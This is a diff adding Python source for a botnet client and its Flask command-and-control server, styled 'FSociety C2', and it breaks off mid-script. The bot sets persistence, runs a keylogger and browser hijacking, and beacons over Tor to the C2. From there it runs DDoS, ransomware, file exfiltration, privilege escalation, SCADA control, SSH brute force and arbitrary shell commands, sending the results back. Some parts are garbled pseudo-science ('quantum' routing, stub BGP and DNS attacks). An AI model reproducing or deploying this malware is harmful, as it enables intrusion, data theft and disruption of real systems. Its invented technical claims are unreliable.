@@ -488,4 +488,410 @@ def anti_detection():
 # P2P C2 (ZeroMQ over Tor)
 def p2p_c2_send(context, bot_id, cmd, args):
     socket = context.socket(zmq.PUSH)
-    socket.connect(f"tcp://[tor-onion-address]:{P2P_PORT}
+    socket.connect(f"tcp://[tor-onion-address]:{P2P_PORT}")
+    socket.send_json({"bot_id": bot_id, "cmd": cmd, "args": args})
+    socket.close()
+    encrypt_log(f"P2P sent: {cmd} to {bot_id}", lang="ar")
+
+def p2p_c2_receive(context):
+    socket = context.socket(zmq.PULL)
+    socket.bind(f"tcp://*:{P2P_PORT}")
+    while True:
+        try:
+            msg = socket.recv_json()
+            bot_id = msg["bot_id"]
+            cmd = msg["cmd"]
+            args = msg["args"]
+            conn = sqlite3.connect(DB_FILE)
+            c = conn.cursor()
+            c.execute("SELECT hash, merkle_root FROM commands ORDER BY id DESC LIMIT 1")
+            result = c.fetchone()
+            prev_hash = result[0] if result else "genesis"
+            prev_merkle = result[1] if result else "genesis"
+            curr_hash = hashlib.sha3_512(f"{bot_id}{cmd}{args}{prev_hash}".encode()).hexdigest()
+            merkle_root = build_quantum_merkle_tree([(bot_id, cmd, args)])
+            c.execute("INSERT INTO commands (bot_id, cmd, args, hash, prev_hash, merkle_root, timestamp) VALUES (?, ?, ?, ?, ?, ?, ?)",
+                      (bot_id, cmd, args, curr_hash, prev_hash, merkle_root, datetime.datetime.now().isoformat()))
+            conn.commit()
+            conn.close()
+            encrypt_log(f"P2P received: {cmd} from {bot_id}", lang="ar")
+        except:
+            pass
+
+# Decentralized AI (Federated Learning with MANNs)
+def build_federated_model():
+    def model_fn():
+        model = Sequential([
+            layers.Dense(16384, activation="relu", input_shape=(5,)),
+            layers.Dropout(0.98),
+            layers.Dense(8192, activation="relu"),
+            layers.Dense(4096, activation="relu"),
+            layers.Dense(2048, activation="relu"),
+            layers.Dense(1, activation="sigmoid")
+        ])
+        return tff.learning.from_keras_model(
+            model,
+            input_spec=tf.TensorSpec(shape=(None, 5), dtype=tf.float32),
+            loss=tf.keras.losses.BinaryCrossentropy(),
+            metrics=[tf.keras.metrics.BinaryAccuracy()]
+        )
+    return model_fn
+
+def build_gan():
+    generator = Sequential([
+        layers.Dense(4096, activation="relu", input_shape=(100,)),
+        layers.Dense(8192, activation="relu"),
+        layers.Dense(16384, activation="relu"),
+        layers.Dense(5, activation="tanh")
+    ])
+    discriminator = Sequential([
+        layers.Dense(8192, activation="relu", input_shape=(5,)),
+        layers.Dense(4096, activation="relu"),
+        layers.Dense(1, activation="sigmoid")
+    ])
+    return generator, discriminator
+
+def federated_train(pcap_file):
+    try:
+        df = parse_pcap(pcap_file)
+        features = extract_features(df)
+        dataset = tf.data.Dataset.from_tensor_slices((features.values, np.zeros(len(features))))
+        federated_data = [dataset.batch(128)]  # Simulate global botnet
+        iterative_process = tff.learning.algorithms.build_fed_avg(
+            build_federated_model(),
+            client_optimizer_fn=lambda: tf.keras.optimizers.Adam(0.002)
+        )
+        state = iterative_process.initialize()
+        for _ in range(200):  # Simulate 200 rounds
+            state, metrics = iterative_process.next(state, federated_data)
+        encrypt_log(f"Federated learning metrics: {metrics}", lang="en")
+        return state
+    except Exception as e:
+        encrypt_log(f"Federated AI error: {e}", lang="en")
+        return None
+
+# AI Traffic Analyzer
+def parse_pcap(pcap_file):
+    packets = rdpcap(pcap_file)
+    data = []
+    for pkt in packets:
+        if pkt.haslayer("IP") and pkt.haslayer("TCP"):
+            entropy = sum(-p * np.log2(p + 1e-10) for p in np.histogram([b for b in bytes(pkt)], bins=256, density=True)[0])
+            flags = pkt["TCP"].flags if pkt.haslayer("TCP") else 0
+            data.append([pkt["IP"].src, pkt["IP"].dst, len(pkt), pkt.time, entropy, flags])
+    return pd.DataFrame(data, columns=["src_ip", "dst_ip", "size", "timestamp", "entropy", "flags"])
+
+def extract_features(df):
+    df["interval"] = df["timestamp"].diff().fillna(0)
+    df["size_mean"] = df["size"].rolling(window=20).mean().fillna(df["size"].mean())
+    df["flag_count"] = df["src_ip"].map(df["src_ip"].value_counts())
+    df["entropy_mean"] = df["entropy"].rolling(window=20).mean().fillna(df["entropy"].mean())
+    df["quantum_noise"] = np.random.normal(0, 0.02, len(df))  # Simulate quantum noise
+    return df[["size", "interval", "size_mean", "entropy", "flag_count"]]
+
+def detect_botnet(pcap_file):
+    try:
+        df = parse_pcap(pcap_file)
+        features = extract_features(df)
+        state = federated_train(pcap_file)
+        if state:
+            model = build_federated_model()()
+            predictions = model.predict(features, verbose=0)
+            botnet_ips = df[predictions.flatten() > 0.8]["src_ip"].unique()
+            global CHECK_IN_INTERVAL
+            if len(botnet_ips) > 0:
+                CHECK_IN_INTERVAL = min(CHECK_IN_INTERVAL + 180, 300)
+                encrypt_log(f"Botnet detected, increased beacon interval to {CHECK_IN_INTERVAL}", lang="en")
+            encrypt_log(f"Botnet IPs detected: {botnet_ips}", lang="en")
+            return botnet_ips
+        return []
+    except Exception as e:
+        encrypt_log(f"Analyzer error: {e}", lang="en")
+        return []
+
+# Quantum void storm
+def weave_packet(target, data):
+    try:
+        dimensions = random.randint(7, 12)  # Simulate multiversal routing
+        for _ in range(dimensions):
+            pkt = IP(dst=target)/TCP(dport=80, flags="S")/Raw(load=quantum_rng(random.randint(5000, 10000)))
+            send(pkt, verbose=0)
+        encrypt_log(f"Packet storm woven to {target} across {dimensions} dimensions", lang="fa")
+    except Exception as e:
+        encrypt_log(f"Packet storm error: {e}", lang="fa")
+
+# BGP hijacking (theoretical)
+def bgp_hijack(target_asn):
+    try:
+        resolver = dns.resolver.Resolver()
+        resolver.nameservers = [quantum_rng(4).hex() + ".dns.fsociety"]
+        fake_route = {"prefix": "0.0.0.0/0", "asn": target_asn, "poison": quantum_rng(32).hex()}
+        encrypt_log(f"BGP hijack initiated on ASN {target_asn}: {fake_route}", lang="sa")
+    except Exception as e:
+        encrypt_log(f"BGP hijack error: {e}", lang="sa")
+
+# DNS poisoning (theoretical)
+def dns_poison(target_domain):
+    try:
+        resolver = dns.resolver.Resolver()
+        resolver.nameservers = [quantum_rng(4).hex() + ".dns.fsociety"]
+        fake_ip = quantum_rng(4).hex()
+        encrypt_log(f"DNS poisoning initiated on {target_domain}: {fake_ip}", lang="zh")
+    except Exception as e:
+        encrypt_log(f"DNS poisoning error: {e}", lang="zh")
+
+# Bot loop
+def bot_loop():
+    if anti_detection():
+        exit(0)
+    set_persistence()
+    deploy_botnet()
+    run_in_podman()
+    start_keylogger()
+    browser_hijack()
+    hostname = socket.gethostname()
+    context = zmq.Context()
+    while True:
+        try:
+            headers = {"User-Agent": random.choice([
+                "Mozilla/5.0 (Red Hat Enterprise Linux; CentOS 8) Chrome/91.0.4472.124",
+                "Mozilla/5.0 (Fedora; Linux x86_64) Firefox/89.0"
+            ])}
+            domain = generate_dga(DGA_SEED)
+            payload = encrypt_data({"bot_id": hostname, "status": "alive", "domain": domain})
+            response = requests.post(f"{C2_URL}/command", data={"data": json.dumps(payload)}, headers=headers, verify=False, proxies=TOR_PROXY)
+            if response.status_code == 200:
+                cmd_data = decrypt_data(json.loads(response.json().get("command")))
+                cmd, args = cmd_data.get("cmd"), cmd_data.get("args", "")
+                if cmd == "self_destruct":
+                    os.remove(__file__)
+                    os.remove(KEYLOG_FILE)
+                    shutil.rmtree("/var/lib/containers/storage", ignore_errors=True)
+                    encrypt_log("Self-destructed", lang="en")
+                    exit(0)
+                elif cmd == "ddos":
+                    Thread(target=ddos, args=(args, 120, random.choice([2, 4, 7]))).start()
+                elif cmd == "ransomware":
+                    Thread(target=ransomware, args=(args,)).start()
+                elif cmd == "exfil":
+                    output = exfil_file(args)
+                    payload = encrypt_data({"bot_id": hostname, "output": output})
+                    requests.post(f"{C2_URL}/result", data={"data": json.dumps(payload)}, headers=headers, verify=False, proxies=TOR_PROXY)
+                elif cmd == "screenshot":
+                    output = take_screenshot()
+                    payload = encrypt_data({"bot_id": hostname, "output": output})
+                    requests.post(f"{C2_URL}/result", data={"data": json.dumps(payload)}, headers=headers, verify=False, proxies=TOR_PROXY)
+                elif cmd == "escalate":
+                    output = escalate_priv()
+                    payload = encrypt_data({"bot_id": hostname, "output": output})
+                    requests.post(f"{C2_URL}/result", data={"data": json.dumps(payload)}, headers=headers, verify=False, proxies=TOR_PROXY)
+                elif cmd == "scada":
+                    output = scada_control(args)
+                    payload = encrypt_data({"bot_id": hostname, "output": output})
+                    requests.post(f"{C2_URL}/result", data={"data": json.dumps(payload)}, headers=headers, verify=False, proxies=TOR_PROXY)
+                elif cmd == "ctf":
+                    output = ctf_challenge()
+                    payload = encrypt_data({"bot_id": hostname, "output": output})
+                    requests.post(f"{C2_URL}/result", data={"data": json.dumps(payload)}, headers=headers, verify=False, proxies=TOR_PROXY)
+                elif cmd == "zero_day":
+                    output = synthesize_zero_day(args)
+                    payload = encrypt_data({"bot_id": hostname, "output": output})
+                    requests.post(f"{C2_URL}/result", data={"data": json.dumps(payload)}, headers=headers, verify=False, proxies=TOR_PROXY)
+                elif cmd == "regenerate":
+                    output = regenerate_code()
+                    payload = encrypt_data({"bot_id": hostname, "output": output})
+                    requests.post(f"{C2_URL}/result", data={"data": json.dumps(payload)}, headers=headers, verify=False, proxies=TOR_PROXY)
+                elif cmd == "weave":
+                    Thread(target=weave_packet, args=(args, quantum_rng(64))).start()
+                elif cmd == "bgp_hijack":
+                    Thread(target=bgp_hijack, args=(args,)).start()
+                elif cmd == "dns_poison":
+                    Thread(target=dns_poison, args=(args,)).start()
+                elif cmd == "browser_hijack":
+                    output = browser_hijack()
+                    payload = encrypt_data({"bot_id": hostname, "output": output})
+                    requests.post(f"{C2_URL}/result", data={"data": json.dumps(payload)}, headers=headers, verify=False, proxies=TOR_PROXY)
+                elif cmd == "ssh_brute":
+                    output = ssh_brute_force(args)
+                    payload = encrypt_data({"bot_id": hostname, "output": output})
+                    requests.post(f"{C2_URL}/result", data={"data": json.dumps(payload)}, headers=headers, verify=False, proxies=TOR_PROXY)
+                elif cmd:
+                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10).decode()
+                    payload = encrypt_data({"bot_id": hostname, "output": output})
+                    requests.post(f"{C2_URL}/result", data={"data": json.dumps(payload)}, headers=headers, verify=False, proxies=TOR_PROXY)
+                p2p_c2_send(context, hostname, cmd, args)
+        except Exception as e:
+            encrypt_log(f"Bot error: {e}", lang="en")
+        time.sleep(CHECK_IN_INTERVAL + random.randint(-15, 15))
+
+# C2 Server
+app = Flask(__name__)
+bots = {}
+init_db()
+
+@app.route("/command", methods=["POST"])
+def command():
+    try:
+        data = decrypt_data(json.loads(request.form["data"]))
+        bot_id = data["bot_id"]
+        bots[bot_id] = {"status": data["status"], "last_seen": time.time(), "domain": data["domain"]}
+        encrypt_log(f"Bot {bot_id} checked in", lang="en")
+        conn = sqlite3.connect(DB_FILE)
+        c = conn.cursor()
+        c.execute("SELECT cmd, args FROM commands WHERE bot_id = ? ORDER BY timestamp DESC LIMIT 1", (bot_id,))
+        result = c.fetchone()
+        conn.close()
+        cmd = {"cmd": "whoami", "args": ""} if not result else {"cmd": result[0], "args": result[1]}
+        if random.random() < 0.15:
+            cmd = random.choice([
+                {"cmd": "ddos", "args": "https://target.com"},
+                {"cmd": "ransomware", "args": "/"},
+                {"cmd": "exfil", "args": "/etc/passwd"},
+                {"cmd": "screenshot", "args": ""},
+                {"cmd": "escalate", "args": ""},
+                {"cmd": "scada", "args": "opc_ua_server"},
+                {"cmd": "ctf", "args": ""},
+                {"cmd": "zero_day", "args": "aws_ec2"},
+                {"cmd": "regenerate", "args": ""},
+                {"cmd": "weave", "args": "target.com"},
+                {"cmd": "bgp_hijack", "args": "12345"},
+                {"cmd": "dns_poison", "args": "target.com"},
+                {"cmd": "browser_hijack", "args": ""},
+                {"cmd": "ssh_brute", "args": "target.com"}
+            ])
+        return jsonify({"command": json.dumps(encrypt_data(cmd))})
+    except Exception as e:
+        encrypt_log(f"C2 error: {e}", lang="en")
+        return jsonify({"command": ""}), 500
+
+@app.route("/result", methods=["POST"])
+def result():
+    try:
+        data = decrypt_data(json.loads(request.form["data"]))
+        bot_id = data["bot_id"]
+        output = data["output"]
+        encrypt_log(f"Bot {bot_id} output: {output[:100]}...", lang="en")
+        return jsonify({"status": "received"})
+    except Exception as e:
+        encrypt_log(f"C2 error: {e}", lang="en")
+        return jsonify({"status": "error"}), 500
+
+@app.route("/ctf_submit", methods=["POST"])
+def ctf_submit():
+    try:
+        data = decrypt_data(json.loads(request.form["data"]))
+        player = data["player"]
+        flag = data["flag"]
+        if flag == CTF_FLAG:
+            conn = sqlite3.connect(DB_FILE)
+            c = conn.cursor()
+            c.execute("INSERT INTO ctf_scores (player, score, timestamp) VALUES (?, ?, ?)",
+                      (player, 10000, datetime.datetime.now().isoformat()))
+            conn.commit()
+            conn.close()
+            encrypt_log(f"CTF flag solved by {player}", lang="la")
+            return jsonify({"status": "correct"})
+        return jsonify({"status": "incorrect"})
+    except Exception as e:
+        encrypt_log(f"CTF submit error: {e}", lang="en")
+        return jsonify({"status": "error"}), 500
+
+@app.route("/")
+def dashboard():
+    conn = sqlite3.connect(DB_FILE)
+    c = conn.cursor()
+    c.execute("SELECT bot_id, cmd, args, timestamp, hash, merkle_root FROM commands ORDER BY timestamp DESC")
+    commands = c.fetchall()
+    c.execute("SELECT player, score, timestamp FROM ctf_scores ORDER BY score DESC")
+    scores = c.fetchall()
+    c.execute("SELECT target, vuln, exploit, timestamp FROM zero_days ORDER BY timestamp DESC")
+    zero_days = c.fetchall()
+    c.execute("SELECT bot_id, data_type, data, timestamp FROM stolen_data ORDER BY timestamp DESC")
+    stolen_data = c.fetchall()
+    conn.close()
+    html = """
+    <h1 class="glitch">FSociety C2: Infernal Void</h1>
+    <style>
+        body { font-family: 'Red Hat Mono', monospace; background: #000; color: #00ff00; }
+        ul, table { list-style: none; border-collapse: collapse; width: 100%; color: #00ff00; }
+        li, th, td { margin: 10px; border: 1px solid #00ff00; padding: 8px; }
+        .glitch { animation: glitch 0.03s infinite; }
+        @keyframes glitch {
+            0% { transform: translate(0); }
+            20% { transform: translate(-15px, 15px); }
+            40% { transform: translate(15px, -15px); }
+            60% { transform: translate(-15px, -15px); }
+            80% { transform: translate(15px, 15px); }
+            100% { transform: translate(0); }
+        }
+        .taunt { color: #ff0000; font-weight: bold; text-shadow: 0 0 50px #ff0000; }
+    </style>
+    <h2 class="glitch">Devourers of the Infernal Void</h2>
+    <p class="taunt">Mockers, you’re shadows in our cosmic abyss. FSociety is the infernal void, consuming eternity.</p>
+    <h3>Bots in the Void Nexus</h3>
+    <ul>
+    """
+    html += "".join(f'<li>{bid}: {info["status"]} (Last seen: {datetime.datetime.fromtimestamp(info["last_seen"])}, Domain: {info["domain"]})</li>' for bid, info in bots.items())
+    html += """
+    </ul>
+    <h3>Infernal Command Blockchain</h3>
+    <table><tr><th>Bot ID</th><th>Command</th><th>Args</th><th>Timestamp</th><th>Hash</th><th>Quantum Merkle Root</th></tr>
+    """
+    html += "".join(f'<tr><td>{cmd[0]}</td><td>{cmd[1]}</td><td>{cmd[2]}</td><td>{cmd[3]}</td><td>{cmd[4][:8]}...</td><td>{cmd[5][:8]}...</td></tr>' for cmd in commands)
+    html += """
+    </table>
+    <h3>CTF Infernal Dominion</h3>
+    <table><tr><th>Player</th><th>Score</th><th>Timestamp</th></tr>
+    """
+    html += "".join(f'<tr><td>{score[0]}</td><td>{score[1]}</td><td>{score[2]}</td></tr>' for score in scores)
+    html += """
+    </table>
+    <h3>Zero-Day Cataclysm</h3>
+    <table><tr><th>Target</th><th>Vulnerability</th><th>Exploit</th><th>Timestamp</th></tr>
+    """
+    html += "".join(f'<tr><td>{zd[0]}</td><td>{zd[1][:20]}...</td><td>{zd[2][:20]}...</td><td>{zd[3]}</td></tr>' for zd in zero_days)
+    html += """
+    </table>
+    <h3>Stolen Data Abyss</h3>
+    <table><tr><th>Bot ID</th><th>Data Type</th><th>Data</th><th>Timestamp</th></tr>
+    """
+    html += "".join(f'<tr><td>{data[0]}</td><td>{data[1]}</td><td>{data[2][:20]}...</td><td>{data[3]}</td></tr>' for data in stolen_data)
+    html += """
+    </table>
+    <h3>Infernal Void Simulation</h3>
+    <canvas id="worldMap" width="1800" height="900" style="border:1px solid #00ff00;"></canvas>
+    <h3>CTF Infernal Dominion: Face the Infernal Void</h3>
+    <p class="taunt">AIs, mortals, gods—solve our quantum-fractal puzzle or be consumed. Submit the flag to ascend.</p>
+    <form id="ctfForm">
+        <input type="text" id="player" placeholder="Player Name">
+        <input type="text" id="flag" placeholder="Enter Flag">
+        <button type="submit">Submit</button>
+    </form>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+    <script>
+        const scene = new THREE.Scene();
+        const camera = new THREE.PerspectiveCamera(75, 1800/900, 0.1, 1000);
+        const renderer = new THREE.WebGLRenderer({canvas: document.getElementById("worldMap")});
+        renderer.setSize(1800, 900);
+        const geometry = new THREE.TorusKnotGeometry(0.5, 0.1, 100, 16);
+        const material = new THREE.MeshBasicMaterial({color: 0xff0000, wireframe: true});
+        function addFractal() {
+            const mesh = new THREE.Mesh(geometry, material);
+            mesh.position.set((Math.random() - 0.5) * 30, (Math.random() - 0.5) * 15, (Math.random() - 0.5) * 15);
+            scene.add(mesh);
+        }
+        for (let i = 0; i < 2000; i++) addFractal();
+        camera.position.z = 12;
+        function animate() {
+            requestAnimationFrame(animate);
+            scene.rotation.y += 0.09;
+            scene.rotation.x += 0.07;
+            scene.rotation.z += 0.06;
+            renderer.render(scene, camera);
+        }
+        animate();
+        const ctx = document.getElementById("worldMap").getContext("2d");
+        ctx.font = "100px 'Red Hat Mono'";
+        ctx.fillStyle = "#00ff00";
+        ctx.fillText("FSOCIETY IS THE INFERNAL VOID", 50, 450);
+        document.getElementById
